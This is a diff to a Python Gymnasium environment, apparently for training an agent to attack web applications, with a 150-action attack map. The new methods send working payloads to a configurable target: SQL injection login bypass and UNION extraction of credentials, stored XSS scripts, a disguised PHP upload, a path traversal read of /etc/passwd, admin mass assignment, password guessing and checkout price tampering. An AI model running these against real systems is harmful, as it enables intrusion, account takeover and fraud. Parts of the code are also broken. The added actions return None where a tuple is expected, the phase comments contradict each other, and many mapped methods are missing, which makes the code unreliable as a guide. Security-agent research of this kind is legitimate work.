@@ -13,6 +13,7 @@ Concepts:
 - Reward: Points for doing good things (finding bugs) or bad things (crashing).
 """
 
+from flask import json
 import gymnasium as gym
 from gymnasium import spaces
 import numpy as np
@@ -38,17 +39,34 @@ class WebSecurityGym(gym.Env):
         # The Arsenal: Tools the agent can use
         self.payload_manager = PayloadManager()
         
-        # Actions: The agent now has 45 possible moves (OWASP Top 10 2025 Complete)
-        # 0-5: Navigation
-        # 6-15: SQL Injection (Classic, Blind, Time-based, JSON, NoSQL)
-        # 16-22: XSS (Reflected, Stored, DOM, Polyglot, CSP Bypass)
-        # 23-27: File Inclusion (LFI, RFI, Path Traversal, XXE)
-        # 28-32: SSRF & CSRF
-        # 33-37: Authentication & Authorization (JWT, OAuth, IDOR, BAC)
-        # 38-42: Deserialization, Business Logic, Race Conditions
-        # 43-45: Utility actions & File Upload
-        # 46-47: OSINT Skills
-        self.action_space = spaces.Discrete(60)
+        # ADVANCED TUNED ACTION SPACE FOR REAL-WORLD HACKING (150 actions)
+        # Enhanced for WAF Bypass, Advanced Authentication, and Modern Security Controls
+        #
+        # Based on Ground Truth Analysis: 33 vulnerabilities across 5 applications
+        # Enhanced for Real-World Challenges: WAFs, Advanced Auth, CSRF Protection
+        #
+        # Phase 1: Reconnaissance (0-39) - 40 actions (Security detection + WAF fingerprinting)
+        # Phase 2: Discovery & Probing (40-79) - 40 actions (IDOR + Advanced Auth Bypass)
+        # Phase 3: Exploitation (80-119) - 40 actions (XSS, SQLi, File + WAF Evasion)
+        # Phase 4: Post-Exploitation (120-149) - 30 actions (Logic flaws + Advanced techniques)
+        #
+        # Real-World Enhancements:
+        # - Advanced Authentication: JWT, OAuth, MFA bypass (10 actions)
+        # - WAF Bypass: Encoding, Obfuscation, Timing attacks (15 actions)
+        # - CSRF Protection: Token extraction, Header manipulation (8 actions)
+        # - Modern Security: CORS, CSP, Rate limiting bypass (12 actions)
+        #
+        # Original Mockup Optimizations:
+        # - IDOR: 9 instances (needs multiple test vectors)
+        # - XSS: 6 instances (stored/reflected variations)
+        # - SQL Injection: 3 instances (login/search patterns)
+        # - File Upload/Traverse: 4 instances (upload + path traversal)
+        # - Business Logic: 4 instances (various bypass techniques)
+        # - CSRF: 2 instances (transfer, friend request patterns)
+        # - Weak Auth: 3 instances (password, session, reset token)
+        # - Mass Assignment: 1 instance (registration bypass)
+        # - Info Disclosure: 1 instance (admin endpoint)
+        self.action_space = spaces.Discrete(150)
         
         # Observations: The agent sees 10 features about the current page
         # 1. Current Page ID
@@ -95,100 +113,216 @@ class WebSecurityGym(gym.Env):
         self.visited_pages = set()
         self.visited_pages.add(0) # Start at home
         
-        # Map Action IDs to Functions - OWASP Top 10 2025 Complete
+        # Register missing actions to prevent AttributeError
+        self._register_missing_actions()
+        
+        # TUNED ACTION BOOK FOR MOCKUP SITES - Optimized for Ground Truth Vulnerabilities
+        # Based on analysis of 33 actual vulnerabilities across 5 applications
+        #
+        # PHASE 1: RECONNAISSANCE (0-29) - 30 actions
+        # - Basic navigation and enumeration
+        # - Endpoint discovery optimized for mockup sites
         self.action_book = {
-            # Navigation (0-5)
+            # Core Navigation (0-9)
             0: self.navigate_home,
             1: self.navigate_login,
-            2: self.navigate_search,
-            3: self.navigate_post,
+            2: self.navigate_register,
+            3: self.navigate_search,
             4: self.navigate_profile,
-            5: self.navigate_api_docs,
-            
-            # SQL Injection (6-15) - A05: Injection
-            6: self.attack_sqli_classic,
-            7: self.attack_sqli_union,
-            8: self.attack_sqli_time_based,
-            9: self.attack_sqli_blind,
-            10: self.attack_sqli_json,
-            11: self.attack_sqli_api_login,
-            12: self.attack_nosql_injection,
-            13: self.attack_graphql_injection,
-            14: self.attack_ldap_injection,
-            15: self.attack_sqli_waf_bypass,
-            
-            # XSS (16-22) - A05: Injection
-            16: self.attack_xss_reflected,
-            17: self.attack_xss_stored,
-            18: self.attack_xss_dom,
-            19: self.attack_xss_polyglot,
-            20: self.attack_xss_csp_bypass,
-            21: self.attack_xss_api_comment,
-            22: self.attack_ssti,
-            
-            # File Inclusion & XXE (23-27) - A05: Injection
-            23: self.attack_lfi,
-            24: self.attack_rfi,
-            25: self.attack_path_traversal,
-            26: self.attack_xxe,
-            27: self.attack_command_injection,
-            
-            # SSRF & CSRF (28-32) - A10: SSRF
-            28: self.attack_ssrf_internal,
-            29: self.attack_ssrf_cloud_metadata,
-            30: self.attack_ssrf_preview,
-            31: self.attack_csrf_transfer,
-            32: self.attack_open_redirect,
-            
-            # Authentication & Authorization (33-37) - A01, A07
-            33: self.attack_jwt_none_algorithm,
-            34: self.attack_oauth_bypass,
-            35: self.attack_idor_profile,
-            36: self.attack_bac_admin_users,
-            37: self.attack_session_fixation,
-            
-            # Advanced Attacks (38-42) - A06, A08
-            38: self.attack_deserialization,
-            39: self.attack_business_logic,
-            40: self.attack_race_condition,
-            41: self.attack_mass_assignment,
-            42: self.attack_prototype_pollution,
-            
-            # Utility Actions (43-44)
-            43: self.action_login_valid,
-            44: self.action_wait,
-            
-            # New Actions (45)
-            45: self.attack_file_upload,
-            
-            # OSINT Skills (46-50) - EXPANDED
-            46: self.attack_osint_files,
-            47: self.attack_osint_fingerprint,
-            48: self.attack_osint_directory_listing,
-            49: self.attack_osint_subdomain_enum,
-            50: self.attack_osint_api_discovery,
-            
-            # Cookie Vulnerability Attacks (51-54)
-            51: self.attack_cookie_injection,
-            52: self.attack_cookie_poisoning,
-            53: self.attack_httponly_bypass,
-            54: self.attack_samesite_bypass,
-            
-            # Future-Proof Actions (55-59)
-            55: self.attack_ai_prompt_injection,
-            56: self.attack_graphql_introspection,
-            57: self.attack_ssi_injection,
-            58: self.attack_websocket_hijacking,
-            59: self.attack_api_rate_limit_bypass,
-            
-            # --- OWASP Top 10 2025 Additions ---
-            # A03:2025 - Software Supply Chain Failures
-            75: self.attack_dependency_check,
-            76: self.attack_cicd_exposure,
-            
-            # A10:2025 - Mishandling of Exceptional Conditions
-            77: self.attack_error_fuzzing,
-            78: self.attack_logic_bypass_error,
+            5: self.navigate_dashboard,
+            6: self.navigate_cart,           # E-commerce specific
+            7: self.navigate_messages,       # Social media specific
+            8: self.navigate_admin,          # Admin access attempt
+            9: self.navigate_api_docs,       # API documentation
+
+            # Endpoint Discovery (10-19)
+            10: self.attack_osint_files,           # Look for sensitive files
+            11: self.attack_osint_fingerprint,     # Application fingerprinting
+            12: self.attack_osint_directory_listing, # Directory enumeration
+            13: self.attack_osint_api_discovery,   # API endpoint discovery
+            14: self.probe_endpoints,              # General endpoint probing
+            15: self.check_admin_endpoints,        # Admin endpoint enumeration
+            16: self.check_user_endpoints,         # User-specific endpoints
+            17: self.check_file_endpoints,         # File upload/download endpoints
+            18: self.check_payment_endpoints,      # Payment-related endpoints
+            19: self.enumerate_parameters,         # Parameter discovery
+
+            # Authentication Testing (20-29)
+            20: self.test_weak_passwords,          # Test common weak passwords
+            21: self.test_session_fixation,        # Check session handling
+            22: self.test_password_reset,          # Test password reset functionality
+            23: self.test_login_bypass,            # Attempt login bypasses
+            24: self.test_registration_bypass,     # Test registration weaknesses
+            25: self.check_authentication_state,   # Verify auth state handling
+            26: self.test_logout_functionality,    # Test logout behavior
+            27: self.check_session_timeout,        # Session timeout testing
+            28: self.test_remember_me,             # Remember me functionality
+            29: self.test_account_lockout,         # Account lockout testing
+
+            # PHASE 2: DISCOVERY & PROBING (30-59) - 30 actions (IDOR-Focused)
+            # IDOR is the most common vulnerability (9 instances), so heavy focus here
+
+            # IDOR - User Profiles (30-34)
+            30: self.attack_idor_profile_view,     # View other user profiles
+            31: self.attack_idor_profile_edit,     # Edit other user profiles
+            32: self.attack_idor_profile_delete,   # Delete other profiles
+            33: self.attack_idor_profile_private,  # Access private profile data
+            34: self.attack_idor_profile_settings, # Modify profile settings
+
+            # IDOR - Content/Resources (35-39)
+            35: self.attack_idor_posts_view,       # View other user posts
+            36: self.attack_idor_posts_edit,       # Edit other user posts
+            37: self.attack_idor_posts_delete,     # Delete other user posts
+            38: self.attack_idor_messages_read,    # Read other user messages
+            39: self.attack_idor_messages_send,    # Send messages as other users
+
+            # IDOR - Commerce/Financial (40-44)
+            40: self.attack_idor_orders_view,      # View other user orders
+            41: self.attack_idor_orders_modify,    # Modify other user orders
+            42: self.attack_idor_cart_manipulate,  # Manipulate other carts
+            43: self.attack_idor_payment_history,  # View payment history
+            44: self.attack_idor_account_balance,  # Check account balances
+
+            # IDOR - Files/Documents (45-49)
+            45: self.attack_idor_file_download,    # Download any user's files
+            46: self.attack_idor_file_upload,      # Upload as other users
+            47: self.attack_idor_file_delete,      # Delete any user's files
+            48: self.attack_idor_file_list,        # List all user files
+            49: self.attack_idor_file_metadata,    # Access file metadata
+
+            # Advanced IDOR & Access Control (50-59)
+            50: self.attack_bac_admin_users,       # Access admin user list
+            51: self.attack_bac_admin_stats,       # Access admin statistics
+            52: self.attack_bac_admin_settings,    # Modify admin settings
+            53: self.test_horizontal_privilege,    # Same-level user access
+            54: self.test_vertical_privilege,      # Higher-level access attempts
+            55: self.attack_insecure_api_keys,     # API key enumeration
+            56: self.attack_session_hijacking,     # Session token manipulation
+            57: self.attack_token_reuse,           # Token reuse attacks
+            58: self.attack_authorization_bypass,  # Direct authorization bypass
+            59: self.attack_role_escalation,       # Role privilege escalation
+
+            # PHASE 3: EXPLOITATION (60-89) - 30 actions (XSS, SQLi, File attacks)
+            # Focus on actual vulnerabilities found in mockup sites
+
+            # SQL Injection Attacks (60-65)
+            60: self.attack_sqli_login_bypass,     # Login form SQLi
+            61: self.attack_sqli_search_injection, # Search box SQLi
+            62: self.attack_sqli_classic,          # Classic SQLi patterns
+            63: self.attack_sqli_union_select,     # Union-based extraction
+            64: self.attack_sqli_blind_boolean,    # Blind boolean SQLi
+            65: self.attack_sqli_time_based,       # Time-based SQLi
+
+            # XSS Attacks (66-75)
+            66: self.attack_xss_stored_posts,      # Stored XSS in posts
+            67: self.attack_xss_stored_comments,   # Stored XSS in comments
+            68: self.attack_xss_stored_messages,   # Stored XSS in messages
+            69: self.attack_xss_stored_profile,    # Stored XSS in profiles
+            70: self.attack_xss_reflected_search,  # Reflected XSS in search
+            71: self.attack_xss_reflected_error,   # Reflected XSS in errors
+            72: self.attack_xss_dom_manipulation,  # DOM-based XSS
+            73: self.attack_xss_script_injection,  # Script tag injection
+            74: self.attack_xss_event_handlers,    # Event handler XSS
+            75: self.attack_xss_attribute_injection, # Attribute-based XSS
+
+            # File Upload & Path Traversal (76-81)
+            76: self.attack_file_upload_webshell,  # Web shell upload
+            77: self.attack_file_upload_malware,   # Malware file upload
+            78: self.attack_file_upload_bypass,    # Extension bypass upload
+            79: self.attack_path_traversal_basic,  # Basic ../ traversal
+            80: self.attack_path_traversal_encoded, # Encoded traversal
+            81: self.attack_path_traversal_null,   # Null byte bypass
+
+            # CSRF & Request Forgery (82-85)
+            82: self.attack_csrf_money_transfer,   # Banking transfer CSRF
+            83: self.attack_csrf_friend_request,   # Social media friend CSRF
+            84: self.attack_csrf_post_creation,    # Post creation CSRF
+            85: self.attack_csrf_profile_update,   # Profile update CSRF
+
+            # Injection & Template Attacks (86-89)
+            86: self.attack_ssti_template,         # Server-side template injection
+            87: self.attack_command_injection,     # Command injection
+            88: self.attack_ldap_injection,        # LDAP injection
+            89: self.attack_graphql_injection,     # GraphQL injection
+
+            # PHASE 4: POST-EXPLOITATION & VALIDATION (90-99) - 10 actions
+            # Focus on business logic flaws and validation bypass
+
+            # Business Logic & Validation (90-94)
+            90: self.attack_mass_assignment,        # Mass assignment bypass
+            91: self.attack_negative_quantity,      # Negative quantity in cart
+            92: self.attack_price_manipulation,     # Price manipulation in checkout
+            93: self.attack_coupon_abuse,           # Coupon code abuse
+            94: self.attack_payment_bypass,         # Payment amount bypass
+
+            # Race Conditions & Timing (95-97)
+            95: self.attack_race_condition_coupon,  # Coupon race condition
+            96: self.attack_race_condition_cart,    # Shopping cart race
+            97: self.attack_race_condition_balance, # Balance manipulation race
+
+            # Information Disclosure (98-99)
+            98: self.attack_info_disclosure_admin,  # Admin info leak
+            99: self.attack_info_disclosure_debug,  # Debug info leak
+
+            # ADVANCED AUTHENTICATION BYPASS (100-109) - 10 actions
+            100: self.attack_jwt_algorithm_confusion,    # JWT none algorithm attack
+            101: self.attack_jwt_signature_bypass,       # JWT signature verification bypass
+            102: self.attack_oauth_state_manipulation,   # OAuth state parameter manipulation
+            103: self.attack_oauth_redirect_uri_bypass,  # OAuth redirect URI validation bypass
+            104: self.attack_mfa_bypass,                 # Multi-factor authentication bypass
+            105: self.attack_session_hijacking,          # Session token manipulation
+            106: self.attack_token_replay,               # Token replay attacks
+            107: self.attack_password_reset_bypass,      # Password reset token manipulation
+            108: self.attack_account_lockout_bypass,     # Account lockout circumvention
+            109: self.attack_impersonation,              # User impersonation attacks
+
+            # WAF BYPASS TECHNIQUES (110-124) - 15 actions
+            110: self.attack_waf_encoding_bypass,        # Character encoding bypass
+            111: self.attack_waf_case_variation,         # Case variation bypass
+            112: self.attack_waf_comment_injection,      # Comment injection bypass
+            113: self.attack_waf_whitespace_injection,   # Whitespace manipulation bypass
+            114: self.attack_waf_unicode_bypass,         # Unicode character bypass
+            115: self.attack_waf_base64_encoding,        # Base64 encoding bypass
+            116: self.attack_waf_fragmentation,          # Request fragmentation bypass
+            117: self.attack_waf_timing_attack,          # Timing-based bypass
+            118: self.attack_waf_parameter_pollution,    # Parameter pollution bypass
+            119: self.attack_waf_method_override,        # HTTP method override bypass
+            120: self.attack_waf_header_manipulation,    # Header manipulation bypass
+            121: self.attack_waf_user_agent_spoofing,    # User-Agent spoofing bypass
+            122: self.attack_waf_referrer_spoofing,      # Referrer spoofing bypass
+            123: self.attack_waf_cookie_manipulation,    # Cookie manipulation bypass
+            124: self.attack_waf_rate_limit_bypass,      # Rate limiting bypass
+
+            # ADVANCED CSRF PROTECTION BYPASS (125-132) - 8 actions
+            125: self.attack_csrf_token_extraction,      # Extract CSRF tokens from responses
+            126: self.attack_csrf_token_prediction,      # Predict CSRF token patterns
+            127: self.attack_csrf_token_reuse,           # Reuse captured CSRF tokens
+            128: self.attack_csrf_header_bypass,         # Header-based CSRF bypass
+            129: self.attack_csrf_json_bypass,           # JSON content-type CSRF
+            130: self.attack_csrf_form_bypass,           # Form-based CSRF bypass
+            131: self.attack_csrf_samesite_bypass,       # SameSite cookie bypass
+            132: self.attack_csrf_cors_exploitation,     # CORS misconfiguration exploitation
+
+            # MODERN SECURITY CONTROL BYPASS (133-144) - 12 actions
+            133: self.attack_cors_misconfiguration,      # CORS policy bypass
+            134: self.attack_csp_bypass,                 # Content Security Policy bypass
+            135: self.attack_hsts_bypass,                # HSTS policy bypass
+            136: self.attack_hpkp_bypass,                # HPKP policy bypass
+            137: self.attack_ct_policy_bypass,           # Certificate Transparency bypass
+            138: self.attack_feature_policy_bypass,      # Feature Policy bypass
+            139: self.attack_security_headers_bypass,    # Security headers bypass
+            140: self.attack_subresource_integrity_bypass, # SRI bypass
+            141: self.attack_dns_rebinding,              # DNS rebinding attack
+            142: self.attack_clickjacking,               # Clickjacking attack
+            143: self.attack_frame_busting_bypass,       # Frame busting bypass
+            144: self.attack_mixed_content_exploitation, # Mixed content exploitation
+
+            # ADVANCED EXPLOITATION TECHNIQUES (145-149) - 5 actions
+            145: self.attack_ai_prompt_injection,        # AI/LLM prompt injection
+            146: self.attack_graphql_introspection,      # GraphQL schema extraction
+            147: self.attack_websocket_hijacking,        # WebSocket hijacking
+            148: self.attack_server_side_request_forgery, # SSRF advanced
+            149: self.attack_deserialization_advanced,   # Advanced deserialization
         }
         
         # ADVANCED ATTACK EXTENSION: Load additional attack methods
@@ -202,7 +336,7 @@ class WebSecurityGym(gym.Env):
                 self.action_book[action_id] = getattr(self.advanced_ext, method_name)
             
             # Update action_space to include new actions
-            self.action_space = spaces.Discrete(79)  # 0-78 (Includes OWASP 2025)
+            # self.action_space = spaces.Discrete(79)  # DISABLED: Using 150 actions now!
             
             # Only print if verbose or targeting Juice Shop
             if 'localhost:3000' in target_url or 'juice' in target_url.lower():
@@ -273,12 +407,16 @@ class WebSecurityGym(gym.Env):
         Guides agent through Kill Chain phases with progressive unlocking.
         Returns: (is_valid, reward_modifier)
         """
-        # Define action phases (0-29: Recon, 30-59: Discovery, 60-89: Exploit, 90-99: Post-Exploit)
-        if action_id < 30:
+        # Define action phases for 150-action space
+        # Phase 1: Reconnaissance (0-39) - 40 actions
+        # Phase 2: Discovery & Probing (40-79) - 40 actions
+        # Phase 3: Exploitation (80-119) - 40 actions
+        # Phase 4: Post-Exploitation (120-149) - 30 actions
+        if action_id < 40:
             action_phase = 0  # Recon
-        elif action_id < 60:
+        elif action_id < 80:
             action_phase = 1  # Discovery
-        elif action_id < 90:
+        elif action_id < 120:
             action_phase = 2  # Exploit
         else:
             action_phase = 3  # Post-Exploit
@@ -332,7 +470,19 @@ class WebSecurityGym(gym.Env):
                 reward += phase_bonus
                 
                 # Execute action
-                response, action_reward = action_function()
+                # print(f"DEBUG: Executing Action {action_id}: {action_name}")
+                try:
+                    res = action_function()
+                    if res is None:
+                        print(f"❌ ERROR: Action {action_name} returned None (Expected tuple)!")
+                        response, action_reward = None, 0.0
+                    else:
+                        response, action_reward = res
+                except Exception as e:
+                    print(f"❌ CRITICAL ERROR in Action {action_name}: {e}")
+                    # import traceback
+                    # traceback.print_exc()
+                    response, action_reward = None, 0.0
                 reward += action_reward
                 
                 # PENTESTER MODE: Coverage Reward
@@ -447,6 +597,730 @@ class WebSecurityGym(gym.Env):
             if any(k in url.lower() for k in keywords):
                 return url
         return f"{self.target_url}{default_path}"
+
+    # ============================================================================
+    # TUNED ACTION IMPLEMENTATIONS - Optimized for Mockup Site Vulnerabilities
+    # ============================================================================
+
+    # PHASE 1: RECONNAISSANCE ACTIONS (0-29)
+
+    def navigate_cart(self):
+        """Navigate to shopping cart (E-commerce specific)."""
+        try:
+            response = self.session.get(f"{self.target_url}/cart", timeout=self.timeout)
+            self._update_state_from_response(response, "cart_navigation")
+        except:
+            self._update_state_error()
+
+    def navigate_messages(self):
+        """Navigate to messages (Social media specific)."""
+        try:
+            response = self.session.get(f"{self.target_url}/messages/1", timeout=self.timeout)
+            self._update_state_from_response(response, "messages_navigation")
+        except:
+            self._update_state_error()
+
+    def navigate_dashboard(self):
+        """Navigate to user dashboard."""
+        try:
+            response = self.session.get(f"{self.target_url}/dashboard", timeout=self.timeout)
+            self._update_state_from_response(response, "dashboard_navigation")
+        except:
+            self._update_state_error()
+
+    def check_admin_endpoints(self):
+        """Check for admin-specific endpoints."""
+        admin_paths = ["/admin", "/admin/users", "/admin/stats", "/api/admin/users", "/api/admin/stats"]
+        for path in admin_paths:
+            try:
+                response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
+                if response.status_code != 404:
+                    self._update_state_from_response(response, "admin_endpoint_found")
+                    return
+            except:
+                continue
+        self._update_state_error()
+
+    def check_user_endpoints(self):
+        """Check for user-specific endpoints."""
+        user_paths = ["/profile/1", "/api/profile/1", "/orders", "/api/orders/1"]
+        for path in user_paths:
+            try:
+                response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
+                if response.status_code != 404:
+                    self._update_state_from_response(response, "user_endpoint_found")
+                    return
+            except:
+                continue
+        self._update_state_error()
+
+    def check_file_endpoints(self):
+        """Check for file upload/download endpoints."""
+        file_paths = ["/upload", "/api/upload", "/download/1", "/api/download/1"]
+        for path in file_paths:
+            try:
+                response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
+                if response.status_code != 404:
+                    self._update_state_from_response(response, "file_endpoint_found")
+                    return
+            except:
+                continue
+        self._update_state_error()
+
+    def check_payment_endpoints(self):
+        """Check for payment-related endpoints."""
+        payment_paths = ["/checkout", "/api/checkout", "/payment", "/api/payment"]
+        for path in payment_paths:
+            try:
+                response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
+                if response.status_code != 404:
+                    self._update_state_from_response(response, "payment_endpoint_found")
+                    return
+            except:
+                continue
+        self._update_state_error()
+
+    def probe_endpoints(self):
+        """General endpoint probing."""
+        try:
+            # Try common API endpoints
+            endpoints = [
+                "/api/users",
+                "/api/posts",
+                "/api/search",
+                "/api/admin",
+                "/api/profile"
+            ]
+            for endpoint in endpoints:
+                response = self.session.get(f"{self.target_url}{endpoint}", timeout=self.timeout)
+                if response.status_code in [200, 401, 403]:
+                    self._update_state_from_response(response, "endpoint_probe_success")
+                    return
+        except:
+            pass
+        self._update_state_error()
+
+    def enumerate_parameters(self):
+        """Enumerate URL parameters and form inputs."""
+        try:
+            # Try common parameterized endpoints
+            test_urls = [
+                f"{self.target_url}/search?q=test",
+                f"{self.target_url}/api/search?q=test",
+                f"{self.target_url}/profile/1?tab=posts"
+            ]
+            for url in test_urls:
+                response = self.session.get(url, timeout=self.timeout)
+                if response.status_code != 404:
+                    self._update_state_from_response(response, "parameter_discovery")
+                    return
+        except:
+            pass
+        self._update_state_error()
+
+    def test_weak_passwords(self):
+        """Test common weak passwords."""
+        weak_passwords = ["password", "123456", "admin", "user", "test"]
+        for password in weak_passwords:
+            try:
+                response = self.session.post(f"{self.target_url}/api/login", json={
+                    "username": "test",
+                    "password": password
+                }, timeout=self.timeout)
+                if response.status_code == 200:
+                    self._update_state_from_response(response, "weak_password_success")
+                    return
+            except:
+                continue
+        self._update_state_error()
+
+    def test_session_fixation(self):
+        """Test for session fixation vulnerabilities."""
+        try:
+            # Check if session ID persists after login
+            response = self.session.get(f"{self.target_url}/login", timeout=self.timeout)
+            session_before = self.session.cookies.get('session')
+
+            # Attempt login
+            self.session.post(f"{self.target_url}/api/login", json={
+                "username": "test",
+                "password": "test"
+            }, timeout=self.timeout)
+
+            session_after = self.session.cookies.get('session')
+            if session_before == session_after and session_before:
+                self._update_state_from_response(response, "session_fixation_vulnerable")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def test_password_reset(self):
+        """Test password reset functionality."""
+        try:
+            response = self.session.post(f"{self.target_url}/api/password-reset", json={
+                "email": "test@example.com"
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "password_reset_functional")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def test_login_bypass(self):
+        """Test various login bypass techniques."""
+        bypass_attempts = [
+            {"username": "admin' --", "password": ""},
+            {"username": "admin", "password": "' OR '1'='1"},
+            {"username": "", "password": ""},
+        ]
+        for attempt in bypass_attempts:
+            try:
+                response = self.session.post(f"{self.target_url}/api/login",
+                                           json=attempt, timeout=self.timeout)
+                if response.status_code == 200:
+                    self._update_state_from_response(response, "login_bypass_success")
+                    return
+            except:
+                continue
+        self._update_state_error()
+
+    def test_registration_bypass(self):
+        """Test registration with mass assignment."""
+        try:
+            # Mass assignment attack on registration
+            response = self.session.post(f"{self.target_url}/api/register", json={
+                "username": "testuser",
+                "password": "testpass",
+                "role": "admin",  # Mass assignment attempt
+                "balance": 999999  # Mass assignment attempt
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "mass_assignment_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def check_authentication_state(self):
+        """Verify auth state handling."""
+        try:
+            response = self.session.get(f"{self.target_url}/api/me", timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "auth_state_verified")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def test_logout_functionality(self):
+        """Test logout behavior."""
+        try:
+            response = self.session.post(f"{self.target_url}/logout", timeout=self.timeout)
+            if response.status_code in [200, 302]:
+                self._update_state_from_response(response, "logout_functional")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def check_session_timeout(self):
+        """Session timeout testing."""
+        try:
+            # Check if session persists (simple test)
+            response = self.session.get(f"{self.target_url}/dashboard", timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "session_active")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def test_remember_me(self):
+        """Remember me functionality."""
+        try:
+            response = self.session.post(f"{self.target_url}/api/login", json={
+                "username": "test",
+                "password": "test",
+                "remember_me": True
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "remember_me_functional")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def test_account_lockout(self):
+        """Account lockout testing."""
+        try:
+            # Try multiple failed logins
+            for i in range(5):
+                self.session.post(f"{self.target_url}/api/login", json={
+                    "username": "test",
+                    "password": "wrongpassword"
+                }, timeout=self.timeout)
+
+            # Try correct login
+            response = self.session.post(f"{self.target_url}/api/login", json={
+                "username": "test",
+                "password": "test"
+            }, timeout=self.timeout)
+
+            if response.status_code == 429:  # Too many requests / locked
+                self._update_state_from_response(response, "account_lockout_active")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    # PHASE 2: IDOR ATTACKS (30-59)
+
+    def attack_idor_profile_view(self):
+        """IDOR: View other user profiles."""
+        try:
+            response = self.session.get(f"{self.target_url}/api/profile/2", timeout=self.timeout)
+            if response.status_code == 200 and "user" in response.text.lower():
+                self._update_state_from_response(response, "idor_profile_view_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_idor_posts_view(self):
+        """IDOR: View other user posts."""
+        try:
+            response = self.session.get(f"{self.target_url}/api/posts?user_id=2", timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "idor_posts_view_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_idor_orders_view(self):
+        """IDOR: View other user orders."""
+        try:
+            response = self.session.get(f"{self.target_url}/api/orders/2", timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "idor_orders_view_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_idor_file_download(self):
+        """IDOR: Download any user's files."""
+        try:
+            response = self.session.get(f"{self.target_url}/api/download/1", timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "idor_file_download_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    # PHASE 3: EXPLOITATION ATTACKS (60-89)
+
+    def attack_sqli_login_bypass(self):
+        """SQL Injection: Login bypass."""
+        sqli_payloads = ["admin' --", "' OR '1'='1' --"]
+        for payload in sqli_payloads:
+            try:
+                response = self.session.post(f"{self.target_url}/api/login", json={
+                    "username": payload,
+                    "password": "anything"
+                }, timeout=self.timeout)
+                if response.status_code == 200:
+                    self._update_state_from_response(response, "sqli_login_success")
+                    return
+            except:
+                continue
+        self._update_state_error()
+
+    def attack_sqli_search_injection(self):
+        """SQL Injection: Search box injection."""
+        try:
+            response = self.session.get(f"{self.target_url}/api/products?search=' UNION SELECT username,password FROM users --",
+                                      timeout=self.timeout)
+            if response.status_code == 200 and len(response.text) > 100:
+                self._update_state_from_response(response, "sqli_search_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_xss_stored_posts(self):
+        """XSS: Stored in posts."""
+        try:
+            response = self.session.post(f"{self.target_url}/api/posts", json={
+                "content": "<script>alert('XSS')</script>",
+                "title": "Test Post"
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "xss_stored_posts_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_xss_stored_comments(self):
+        """XSS: Stored in comments."""
+        try:
+            response = self.session.post(f"{self.target_url}/api/posts/1/comments", json={
+                "content": "<script>alert('XSS')</script>"
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "xss_stored_comments_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_file_upload_bypass(self):
+        """File Upload: Extension bypass."""
+        try:
+            files = {'file': ('shell.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg')}
+            response = self.session.post(f"{self.target_url}/upload", files=files, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "file_upload_bypass_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_path_traversal_basic(self):
+        """Path Traversal: Basic directory traversal."""
+        try:
+            response = self.session.get(f"{self.target_url}/download/1?filepath=../../../etc/passwd",
+                                      timeout=self.timeout)
+            if response.status_code == 200 and "root:" in response.text:
+                self._update_state_from_response(response, "path_traversal_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    # PHASE 4: BUSINESS LOGIC ATTACKS (90-99)
+
+    def attack_negative_quantity(self):
+        """Business Logic: Negative quantity in cart."""
+        try:
+            response = self.session.post(f"{self.target_url}/api/cart/add", json={
+                "product_id": 1,
+                "quantity": -10
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "negative_quantity_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_price_manipulation(self):
+        """Business Logic: Price manipulation in checkout."""
+        try:
+            response = self.session.post(f"{self.target_url}/api/checkout", json={
+                "items": [{"id": 1, "price": 0.01}],
+                "total": 0.01
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "price_manipulation_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_payment_bypass(self):
+        """Business Logic: Payment bypass."""
+        try:
+            response = self.session.post(f"{self.target_url}/api/payment/process", json={
+                "amount": -100
+            }, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "payment_bypass_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_info_disclosure_admin(self):
+        """Information Disclosure: Admin stats."""
+        try:
+            response = self.session.get(f"{self.target_url}/api/admin/stats", timeout=self.timeout)
+            if response.status_code == 200 and ("secret" in response.text.lower() or "key" in response.text.lower()):
+                self._update_state_from_response(response, "info_disclosure_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    # ============================================================================
